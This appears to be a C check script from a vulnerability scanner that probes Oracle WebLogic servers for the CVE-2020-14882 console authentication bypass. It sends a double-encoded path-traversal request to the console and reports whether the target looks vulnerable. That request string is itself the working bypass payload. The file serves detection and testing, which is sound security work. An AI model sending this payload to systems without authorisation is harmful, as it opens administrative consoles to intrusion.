/* http-vuln-cve2020-14882-4 - WebLogic console auth bypass probe. */
#include "arsenal_util.h"

int almap_script_run(AlScriptContext *ctx) {
    char resp[8192];
    int n;

    if (!ar_valid(ctx)) {
        return 1;
    }
    n = ar_http_request(ctx, "GET", "/console/css/%252e%252e%252fconsole.portal", NULL, NULL, NULL, NULL,
                        resp, sizeof(resp));
    if (n <= 0) {
        ar_out(ctx, "http-vuln-cve2020-14882-4: no HTTP response");
        return 0;
    }
    if (ar_contains_ci(resp, "WebLogic")) {
        ar_out(ctx, "VULNERABLE: /console/css/%252e%252e%252fconsole.portal [%d] (CVE-2020-14882)", ar_http_status(resp));
    } else {
        ar_out(ctx, "not vulnerable: CVE-2020-14882 (/console/css/%252e%252e%252fconsole.portal [%d])", ar_http_status(resp));
    }
    return 0;
}
